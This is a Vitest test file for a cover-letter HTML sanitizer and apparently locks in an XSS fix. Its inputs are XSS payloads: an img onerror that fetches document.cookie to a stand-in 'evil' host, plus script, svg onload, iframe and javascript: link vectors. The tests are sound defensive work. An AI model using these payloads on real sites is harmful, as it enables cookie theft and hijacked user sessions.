import { describe, it, expect } from "vitest";
import { sanitizeLetterHtml } from "../lib/sanitizeHtml";

// Locks the cover-letter XSS fix: the body is rendered via innerHTML in the
// admin's session (LAW #37 review) + live-broadcast to peers, so the sanitizer
// must strip every script-execution vector while keeping plain formatting.
describe("sanitizeLetterHtml", () => {
  it("strips img onerror payloads", () => {
    const out = sanitizeLetterHtml(`<img src=x onerror="fetch('//evil/'+document.cookie)">`);
    expect(out).not.toMatch(/onerror/i);
    expect(out).not.toMatch(/<img/i);
  });

  it("strips <script>", () => {
    expect(sanitizeLetterHtml(`<script>alert(1)</script>hi`)).not.toMatch(/<script/i);
  });

  it("strips svg/iframe/object", () => {
    const out = sanitizeLetterHtml(`<svg onload=alert(1)></svg><iframe src=javascript:alert(1)></iframe><object data=x></object>`);
    expect(out).not.toMatch(/<svg|<iframe|<object|onload|javascript:/i);
  });

  it("strips event handlers from allowed tags", () => {
    const out = sanitizeLetterHtml(`<p onclick="alert(1)">text</p>`);
    expect(out).toMatch(/text/);
    expect(out).not.toMatch(/onclick/i);
  });

  it("removes anchors but keeps their text (no javascript: href)", () => {
    const out = sanitizeLetterHtml(`<a href="javascript:alert(1)">click</a>`);
    expect(out).not.toMatch(/<a|href|javascript:/i);
    expect(out).toMatch(/click/);
  });

  it("keeps benign formatting tags", () => {
    const out = sanitizeLetterHtml(`<b>bold</b> <i>it</i> <u>u</u><ul><li>one</li></ul>`);
    expect(out).toMatch(/<b>bold<\/b>/);
    expect(out).toMatch(/<i>it<\/i>/);
    expect(out).toMatch(/<li>one<\/li>/);
  });

  it("returns plain text unchanged", () => {
    expect(sanitizeLetterHtml("Sehr geehrte Damen und Herren")).toBe("Sehr geehrte Damen und Herren");
  });
});
